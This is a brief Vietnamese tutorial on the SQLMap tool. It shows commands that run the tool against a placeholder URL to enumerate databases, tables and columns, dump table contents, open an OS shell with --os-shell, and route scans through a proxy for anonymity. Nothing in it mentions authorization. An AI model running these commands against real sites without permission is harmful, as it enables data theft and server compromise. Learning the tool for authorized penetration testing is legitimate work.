# Write-Up Sử Dụng SQLMap

## SQLMap là một công cụ mã nguồn mở rất mạnh mẽ dùng để kiểm tra lỗ hổng SQL Injection và khai thác nó. Dưới đây là hướng dẫn chi tiết về cách sử dụng SQLMap và từng chức năng của nó.

### 1. Cài đặt SQLMap
- SQLMap có thể được cài đặt dễ dàng từ GitHub hoặc thông qua các package manager. Để cài đặt từ GitHub, bạn có thể sử dụng lệnh:

```bash
git clone https://github.com/sqlmapproject/sqlmap.git
```
- Sau khi tải xong, bạn có thể chạy SQLMap bằng cách vào thư mục sqlmap và sử dụng lệnh:

```bash
python sqlmap.py
```

### 2. Các Chức Năng Chính của SQLMap
- Xác định URL và các thông số: Để bắt đầu quét, bạn cần chỉ định URL có thể chứa lỗ hổng SQL Injection. Ví dụ:

```bash
python sqlmap.py -u "http://example.com/page.php?id=1"
```

- Kiểm tra tự động: SQLMap sẽ tự động kiểm tra các lỗ hổng SQL Injection. Nếu có lỗ hổng, bạn có thể thấy thông báo tương ứng. Để tăng cường kiểm tra, có thể thêm tùy chọn --level để chỉ định độ sâu của việc kiểm tra:

```bash
python sqlmap.py -u "http://example.com/page.php?id=1" --level=5
```

- Khai thác dữ liệu: SQLMap cho phép bạn khai thác dữ liệu từ cơ sở dữ liệu. Bạn có thể sử dụng lệnh sau để liệt kê các cơ sở dữ liệu:

```bash
python sqlmap.py -u "http://example.com/page.php?id=1" --dbs
```

- Sau khi biết được các cơ sở dữ liệu, bạn có thể chọn một trong số đó để xem các bảng:

```bash
python sqlmap.py -u "http://example.com/page.php?id=1" -D <database_name> --tables
```

- Lấy thông tin bảng và cột: Sau khi có danh sách bảng, bạn có thể lấy thông tin cột trong một bảng cụ thể:

```bash
python sqlmap.py -u "http://example.com/page.php?id=1" -D <database_name> -T <table_name> --columns
```

- Khai thác dữ liệu từ bảng: Để lấy dữ liệu từ một bảng cụ thể, sử dụng lệnh:

```bash
python sqlmap.py -u "http://example.com/page.php?id=1" -D <database_name> -T <table_name> --dump
```

- Kết nối Shell: SQLMap cũng cho phép bạn lấy một shell để tương tác với máy chủ cơ sở dữ liệu:

```bash
python sqlmap.py -u "http://example.com/page.php?id=1" --os-shell
```

### 3. Một số tùy chọn bổ sung
- Thêm Cookie: Nếu trang web yêu cầu cookie để xác thực, bạn có thể thêm tùy chọn --cookie:

```bash
python sqlmap.py -u "http://example.com/page.php?id=1" --cookie="sessionid=123456"
```

- Sử dụng Proxy: Để ẩn danh khi quét, bạn có thể sử dụng proxy:

```bash
python sqlmap.py -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```
# Tài nguyên tham khảo
SQLMap Official Documentation
SQL Injection: What You Need to Know
